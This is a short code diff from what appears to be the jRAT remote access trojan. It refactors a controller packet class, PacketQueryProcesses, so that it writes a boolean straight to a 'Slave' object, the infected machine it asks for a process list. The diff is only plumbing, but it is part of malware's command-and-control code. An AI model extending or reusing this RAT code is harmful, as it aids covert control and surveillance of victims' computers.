@@ -3,8 +3,6 @@ package jrat.module.process;
 import jrat.controller.Slave;
 import jrat.controller.packets.outgoing.AbstractOutgoingPacket;
 
-import java.io.DataOutputStream;
-
 
 public class PacketQueryProcesses extends AbstractOutgoingPacket {
 	
@@ -19,8 +17,8 @@ public class PacketQueryProcesses extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(Slave slave, DataOutputStream dos) throws Exception {
-		dos.writeBoolean(icons);
+	public void write(Slave slave) throws Exception {
+		slave.writeBoolean(icons);
 	}
 
 	@Override
